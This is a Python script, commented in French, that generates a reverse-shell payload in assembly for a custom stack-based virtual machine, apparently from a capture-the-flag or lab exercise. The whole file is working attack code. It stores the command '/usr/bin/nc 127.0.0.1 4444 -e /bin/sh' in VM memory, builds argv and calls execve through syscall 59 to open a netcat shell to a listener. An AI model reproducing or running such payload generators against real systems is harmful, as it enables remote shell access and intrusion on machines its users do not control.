import struct

# === CONFIGURATION REVERSE SHELL ===
IP = "127.0.0.1"
PORT = "4444"

# Commande: /usr/bin/nc IP PORT -e /bin/sh
# (Assure-toi que ta VM a accès à /usr/bin/nc et qu'il supporte -e)
# Sinon, utilise: "/bin/sh" tout court pour tester un execve simple
COMMAND_PARTS = [
    "/usr/bin/nc",
    IP,
    PORT,
    "-e",
    "/bin/sh"
]

# === ADRESSAGE MEMOIRE VM (Arbitraire) ===
# On stocke les chaines loin dans la mémoire (indices > 100)
BASE_ADDR_STRINGS = 50 
ADDR_ARGV = 10     # Où stocker le tableau de pointeurs argv

def string_to_qwords(s):
    """Découpe une string en entiers 64 bits Little Endian"""
    s = s.encode() + b'\x00' # Null terminator
    while len(s) % 8 != 0:
        s += b'\x00' # Padding
    
    qwords = []
    for i in range(0, len(s), 8):
        chunk = s[i:i+8]
        val = struct.unpack("<Q", chunk)[0] # <Q = Little Endian Unsigned Long Long
        qwords.append(val)
    return qwords

asm_code = []
asm_code.append("; === REVERSE SHELL PAYLOAD ===")
asm_code.append("; Generé automatiquement")

argv_pointers = []
current_str_addr = BASE_ADDR_STRINGS

# 1. Écrire les chaînes en mémoire
for arg in COMMAND_PARTS:
    chunks = string_to_qwords(arg)
    
    # On sauvegarde l'adresse de début de cette chaîne pour argv
    argv_pointers.append(current_str_addr)
    
    asm_code.append(f"; String: '{arg}' à l'adresse {current_str_addr}")
    for i, val in enumerate(chunks):
        target_idx = current_str_addr + i
        # PUSH la valeur
        asm_code.append(f"PUSH 0x{val:X}")
        # STORE à l'index
        asm_code.append(f"STORE {target_idx}")
    
    current_str_addr += len(chunks)

# 2. Construire le tableau argv (tableau de pointeurs vers les chaînes)
asm_code.append(f"; --- Construction de argv[] à l'adresse {ADDR_ARGV} ---")
for i, ptr in enumerate(argv_pointers):
    asm_code.append(f"PUSH {ptr}")     # Valeur (Pointeur vers chaine)
    asm_code.append(f"STORE {ADDR_ARGV + i}") # Stockage dans argv[i]

# Null terminator pour argv
asm_code.append(f"PUSH 0")
asm_code.append(f"STORE {ADDR_ARGV + len(argv_pointers)}")

# 3. Préparer la Stack pour SYSCALL 59 (EXECVE)
# Convention Handler: ID, ARG1, ARG2, ARG3 sont POPés.
# Donc on doit les PUSHER dans l'ordre inverse : ARG3, ARG2, ARG1, ID.

asm_code.append("; --- Appel SYSCALL ---")

# ARG3: envp (NULL) -> PUSH 0
asm_code.append("PUSH 0")

# ARG2: argv (Pointeur vers le début du tableau argv) -> PUSH 10
asm_code.append(f"PUSH {ADDR_ARGV}")

# ARG1: filename (Pointeur vers la première chaîne: /usr/bin/nc) -> PUSH 50
asm_code.append(f"PUSH {argv_pointers[0]}")

# ID: 59 (sys_execve)
asm_code.append("PUSH 59")

# EXECUTION
asm_code.append("SYS")
asm_code.append("HALT")

# Écriture du fichier
with open("payload.asm", "w") as f:
    f.write("\n".join(asm_code))

print("[+] Fichier payload.asm généré !")
print("Exécute maintenant: python assembler.py payload.asm")